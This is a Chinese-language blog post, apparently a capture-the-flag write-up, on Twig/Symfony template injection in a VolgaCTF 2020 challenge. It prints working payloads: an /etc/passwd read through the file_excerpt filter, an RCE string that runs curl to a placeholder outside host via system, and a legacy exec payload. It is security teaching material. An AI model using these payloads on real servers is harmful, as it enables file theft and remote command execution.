@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":"enable","show_result":false,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="上周末做了volgactf, 里面有道twig 的模板注入还是比较有意思的，我瞅了一天多想找RCE的链，但是由于菜没找到，队友不到一个多小时找到了读任意文件的方法。队友太强了.jpg 我菜爆了.jpg 先看结论 twig with symfony ssti 有两种利用方式（单独twig无法利用下面的方法）  任意文件读取 {{&amp;#39;/etc/passwd&amp;#39;|file_excerpt(-">
+<meta name="keywords" content="php,ssti">
+<meta property="og:type" content="article">
+<meta property="og:title" content="twig 3.x with symfony ssti payloads">
+<meta property="og:url" content="https://blog.sometimenaive.com/2020/04/08/twig3.x-with-symfony-ssti-payloads/index.html">
+<meta property="og:site_name" content="yxxx&#39;s blog">
+<meta property="og:description" content="上周末做了volgactf, 里面有道twig 的模板注入还是比较有意思的，我瞅了一天多想找RCE的链，但是由于菜没找到，队友不到一个多小时找到了读任意文件的方法。队友太强了.jpg 我菜爆了.jpg 先看结论 twig with symfony ssti 有两种利用方式（单独twig无法利用下面的方法）  任意文件读取 {{&amp;#39;/etc/passwd&amp;#39;|file_excerpt(-">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330092402671.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330103914037.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330112006767.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330121624323.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330121752854.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330122251208.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330122624763.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330122936531.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330123542806.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330124846240.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330130804980.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330131712638.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330132002996.png">
+<meta property="og:updated_time" content="2020-06-06T13:38:43.585Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="twig 3.x with symfony ssti payloads">
+<meta name="twitter:description" content="上周末做了volgactf, 里面有道twig 的模板注入还是比较有意思的，我瞅了一天多想找RCE的链，但是由于菜没找到，队友不到一个多小时找到了读任意文件的方法。队友太强了.jpg 我菜爆了.jpg 先看结论 twig with symfony ssti 有两种利用方式（单独twig无法利用下面的方法）  任意文件读取 {{&amp;#39;/etc/passwd&amp;#39;|file_excerpt(-">
+<meta name="twitter:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330092402671.png">
+  <link rel="canonical" href="https://blog.sometimenaive.com/2020/04/08/twig3.x-with-symfony-ssti-payloads/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>twig 3.x with symfony ssti payloads | yxxx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yxxx's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://blog.sometimenaive.com/2020/04/08/twig3.x-with-symfony-ssti-payloads/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yxxx">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yxxx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">twig 3.x with symfony ssti payloads
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2020-04-08 08:00:00" itemprop="dateCreated datePublished" datetime="2020-04-08T08:00:00+08:00">2020-04-08</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-06-06 21:38:43" itemprop="dateModified" datetime="2020-06-06T21:38:43+08:00">2020-06-06</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>上周末做了volgactf, 里面有道twig 的模板注入还是比较有意思的，我瞅了一天多想找RCE的链，但是由于菜没找到，队友不到一个多小时找到了读任意文件的方法。队友太强了.jpg 我菜爆了.jpg</p>
+<p>先看结论 twig with symfony ssti 有两种利用方式（单独twig无法利用下面的方法）</p>
+<ul>
+<li>任意文件读取<ul>
+<li><code>{{&#39;/etc/passwd&#39;|file_excerpt(-1,-1)}}</code></li>
+</ul>
+</li>
+<li>RCE<ul>
+<li><code>{{app.request.query.filter(0,&#39;curl${IFS}x.x.x.x:8090&#39;,1024,{&#39;options&#39;:&#39;system&#39;})}}</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目连接<a href="http://newsletter.q.2020.volgactf.ru/" target="_blank" rel="noopener">http://newsletter.q.2020.volgactf.ru/</a></p>
+<p>题目给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mailer</span>\<span class="title">MailerInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mime</span>\<span class="title">Email</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'main.twig'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">subscribe</span><span class="params">(Request $request, MailerInterface $mailer)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $msg = <span class="string">''</span>;</span><br><span class="line">      $email = filter_var($request-&gt;request-&gt;get(<span class="string">'email'</span>, <span class="string">''</span>), FILTER_VALIDATE_EMAIL);</span><br><span class="line">      <span class="keyword">if</span>($email !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        $name = substr($email, <span class="number">0</span>, strpos($email, <span class="string">'@'</span>));</span><br><span class="line"></span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;get(<span class="string">'twig'</span>)-&gt;createTemplate(</span><br><span class="line">          <span class="string">"&lt;p&gt;Hello $&#123;name&#125;.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;"</span></span><br><span class="line">        )-&gt;render();</span><br><span class="line"></span><br><span class="line">        $mail = (<span class="keyword">new</span> Email())-&gt;from(<span class="string">'newsletter@newsletter.q.2020.volgactf.ru'</span>)-&gt;to($email)-&gt;subject(<span class="string">'VolgaCTF Newsletter'</span>)-&gt;html($content);</span><br><span class="line">        $mailer-&gt;send($mail);</span><br><span class="line"></span><br><span class="line">        $msg = <span class="string">'Success'</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">'Invalid email'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'main.twig'</span>, [<span class="string">'msg'</span> =&gt; $msg]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">'&lt;pre&gt;'</span>.htmlspecialchars(file_get_contents(<span class="keyword">__FILE__</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过源码可以看到，传一个邮件地址，然后截取@前面的username，插入到模板，造成模板注入。</p>
+<p>首先一个合法的email地址是什么样的？</p>
+<p>一种方法就是去翻rfc</p>
+<p><a href="https://tools.ietf.org/html/rfc5321#section-4.5.3.1.1" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc5321#section-4.5.3.1.1</a></p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330092402671.png" alt="image-20200330092402671"></p>
+<p>从上图可以看到local-part 可以是Quoted-string，双引号中间的内容QcontentSMTP，可以是\x32-\x126</p>
+<p>也可以是32-126 的ascci 中间不能包含<code>&quot;</code>（32） <code>\</code>(92). </p>
+<p>那么我们就可以得出一个结论了合法的email地址可以是</p>
+<p><code>&quot;</code> + 非双引号+非反斜杠 <code>&quot;</code>  </p>
+<p>另一种方法是去翻源码</p>
+<p><a href="https://github.com/php/php-src/blob/master/ext/filter/logical_filters.c#L647" target="_blank" rel="noopener">https://github.com/php/php-src/blob/master/ext/filter/logical_filters.c#L647</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(?!(?:(?:\x22?\x5C[\x00-\x7E]\x22?)|(?:\x22?[^\x5C\x22]\x22?))&#123;255,&#125;)(?!(?:(?:\x22?\x5C[\x00-\x7E]\x22?)|(?:\x22?[^\x5C\x22]\x22?))&#123;65,&#125;@)(?:(?:[\x21\x23-\x27\x2A\x2B\x2D\x2F-\x39\x3D\x3F\x5E-\x7E]+)|(?:\x22(?:[\x01-\x08\x0B\x0C\x0E-\x1F\x21\x23-\x5B\x5D-\x7F]|(?:\x5C[\x00-\x7F]))*\x22))(?:\.(?:(?:[\x21\x23-\x27\x2A\x2B\x2D\x2F-\x39\x3D\x3F\x5E-\x7E]+)|(?:\x22(?:[\x01-\x08\x0B\x0C\x0E-\x1F\x21\x23-\x5B\x5D-\x7F]|(?:\x5C[\x00-\x7F]))*\x22)))*@(?:(?:(?!.*[^.]&#123;64,&#125;)(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\.)&#123;1,126&#125;)&#123;1,&#125;(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\[(?:(?:IPv6:(?:(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)|(?:(?!(?:.*[a-f0-9][:\]])&#123;7,&#125;)(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,5&#125;)?::(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,5&#125;)?)))|(?:(?:IPv6:(?:(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;5&#125;:)|(?:(?!(?:.*[a-f0-9]:)&#123;5,&#125;)(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,3&#125;)?::(?:[a-f0-9]&#123;1,4&#125;(?::[a-f0-9]&#123;1,4&#125;)&#123;0,3&#125;:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]&#123;2&#125;)|(?:[1-9]?[0-9]))(?:\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]&#123;2&#125;)|(?:[1-9]?[0-9])))&#123;3&#125;))\]))$</span><br></pre></td></tr></table></figure>
+<p>好像不太好看懂！决定正面搞一下那个表达式</p>
+<p><code>x(?!y)</code> </p>
+<blockquote>
+<p>仅仅当’x’后面不跟着’y’时匹配’x’，这被称为正向否定查找。</p>
+<p>例如，仅仅当这个数字后面没有跟小数点的时候，/\d+(?!.)/ 匹配一个数字。正则表达式/\d+(?!.)/.exec(“3.141”)匹配‘141’而不是‘3.141’</p>
+</blockquote>
+<p><code>(?:x)</code></p>
+<blockquote>
+<p>匹配 ‘x’ 但是不记住匹配项。这种括号叫作<em>非捕获括号</em>，使得你能够定义与正则表达式运算符一起使用的子表达式。看看这个例子 <code>/(?:foo){1,2}/</code>。如果表达式是 <code>/foo{1,2}/</code>，<code>{1,2}</code> 将只应用于 ‘foo’ 的最后一个字符 ‘o’。如果使用非捕获括号，则 <code>{1,2}</code> 会应用于整个 ‘foo’ 单词</p>
+</blockquote>
+<p>找到了一个网站<a href="https://www.debuggex.com/" target="_blank" rel="noopener">https://www.debuggex.com/</a> 可以进行可视化显示</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330103914037.png" alt="image-20200330103914037"></p>
+<p>意思是开头</p>
+<ul>
+<li>不能是除\x7f的字符255+</li>
+<li>不能是@前面65+</li>
+</ul>
+<p>手动测试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;@c.om</span><br></pre></td></tr></table></figure>
+<p>下面不行 可能开头不满足</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;@c.om</span><br></pre></td></tr></table></figure>
+<p>虽然php源码里判断了最大长度是320,由于255的限制我觉得@前最大长度也就是254.</p>
+<p>测试发现最大的长度是258，<code>@c.c</code> 还需要四个</p>
+<p>我们来验证一下</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330112006767.png" alt="image-20200330112006767"></p>
+<p>到这里我们什么是合法的email地址的问题基本解决了，下一步是怎么回显？服务器会渲染之后的模板发到邮箱里面，我们怎么才能看到呢？</p>
+<ol>
+<li>注册邮箱<ol>
+<li>大公司的邮箱不许有特殊字符，而且注册比较麻烦</li>
+<li>临时邮箱也不支持全部的字符,有的设置不支持自定义用户名<a href="https://temp-mail.org/en/" target="_blank" rel="noopener">https://temp-mail.org/en/</a> 这个临时支持自定义用户名</li>
+</ol>
+</li>
+<li>自己搭建STMP服务器</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> asyncore</span><br><span class="line"><span class="keyword">from</span> smtpd <span class="keyword">import</span> SMTPServer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmlServer</span><span class="params">(SMTPServer)</span>:</span></span><br><span class="line">    no = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_message</span><span class="params">(self, peer, mailfrom, rcpttos, data, mail_options=None,rcpt_options=None)</span>:</span></span><br><span class="line">        filename = <span class="string">'%s-%d.eml'</span> % (datetime.now().strftime(<span class="string">'%Y%m%d%H%M%S'</span>),</span><br><span class="line">                self.no)</span><br><span class="line">        f = open(filename, <span class="string">'wb'</span>)</span><br><span class="line">        print(data)</span><br><span class="line">        f.write(data)</span><br><span class="line">        f.close</span><br><span class="line">        print(<span class="string">'%s saved.'</span> % filename)</span><br><span class="line">        self.no += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    foo = EmlServer((<span class="string">'0.0.0.0'</span>, <span class="number">25</span>), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        asyncore.loop()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+<p>然后再设置DNS mx解析到你vps的ip即可。</p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>比赛之前能搜到的的payload是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}</span><br></pre></td></tr></table></figure>
+<p>但是这个payload只能在1.x能利用，因为1.x有三个全局变量</p>
+<blockquote>
+<p>The following variables are always available in templates:</p>
+<ul>
+<li><code>_self</code>: references the current template;</li>
+<li><code>_context</code>: references the current context;</li>
+<li><code>_charset</code>: references the current charset.</li>
+</ul>
+</blockquote>
+<p> 对应的代码是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected $specialVars = [</span><br><span class="line">        &apos;_self&apos; =&gt; &apos;$this&apos;,</span><br><span class="line">        &apos;_context&apos; =&gt; &apos;$context&apos;,</span><br><span class="line">        &apos;_charset&apos; =&gt; &apos;$this-&gt;env-&gt;getCharset()&apos;,</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure>
+<p>2.x 及3.x 以后</p>
+<blockquote>
+<p>The following variables are always available in templates:</p>
+<ul>
+<li><code>_self</code>: references the current template name;</li>
+<li><code>_context</code>: references the current context;</li>
+<li><code>_charset</code>: references the current charset.</li>
+</ul>
+</blockquote>
+<p><code>_self</code> 不再试<code>$this</code> 而是template name 只是个String</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private $specialVars = [</span><br><span class="line">        &apos;_self&apos; =&gt; &apos;$this-&gt;getTemplateName()&apos;,</span><br><span class="line">        &apos;_context&apos; =&gt; &apos;$context&apos;,</span><br><span class="line">        &apos;_charset&apos; =&gt; &apos;$this-&gt;env-&gt;getCharset()&apos;,</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure>
+<p>又搜了一会，还是搜不到，然后就硬着头皮下了源码去找。</p>
+<p>首先去找了文档，看了有没有能够能执行php代码的标签，发现没有，然后又试了include 发现也不行。无意间发现了除了上面三个全局变量以外，在Symfony环境下还有个全局变量app，然后想以这个为突破口找到rce的链，但是由于菜，也没有找到。在我弃疗之后，队友通过symfony内置的filters，能够读任意文件，flag在/etc/passwd 里藏着，我猜可能出题人也没找到RCE的方法。今早看到了出题人的writeup，果然有大佬成功搞到了RCE，就是通过app这个方向搞下去的。</p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>除了twig自带的Filters, symfony 也有实现了一些filters</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330121624323.png" alt="image-20200330121624323"></p>
+<p>这次利用的对象就是<code>file_excerpt</code></p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330121752854.png" alt="image-20200330121752854"></p>
+<p>所以payload 可以是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;{{ &apos;/etc/passwd&apos;|file_excerpt(-1,-1)}}&quot;@xxxx.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330122251208.png" alt="image-20200330122251208"></p>
+<p>看一下file_excerpt 的实现</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330122624763.png" alt="image-20200330122624763"></p>
+<p>如果有文件上传，结合上phar进行反序列化然后RCE也是有可能的。</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330122936531.png" alt="image-20200330122936531"></p>
+<blockquote>
+<p>The <code>app</code> variable (which is an instance of <code>AppVariable</code>) gives you access to these variables:</p>
+<ul>
+<li><p><code>app.user</code></p>
+<p>The <a href="https://symfony.com/doc/current/security.html#create-user-class" target="_blank" rel="noopener">current user object</a> or <code>null</code> if the user is not authenticated.</p>
+</li>
+<li><p><code>app.request</code></p>
+<p>The <code>Request</code> object that stores the current <a href="https://symfony.com/doc/current/components/http_foundation.html#accessing-request-data" target="_blank" rel="noopener">request data</a> (depending on your application, this can be a <a href="https://symfony.com/doc/current/components/http_kernel.html#http-kernel-sub-requests" target="_blank" rel="noopener">sub-request</a> or a regular request).</p>
+</li>
+</ul>
+</blockquote>
+<p><code>app.request</code> 是<code>Symfony\Component\HttpFoundation\Request</code> Object</p>
+<p>他的query 和 request这些属性都是可以公开访问的, 而且都是<code>ParameterBag</code> 类型的</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20200330123542806.png" alt="image-20200330123542806"></p>
+<p><code>ParameterBag</code> 有个 filter方法</p>
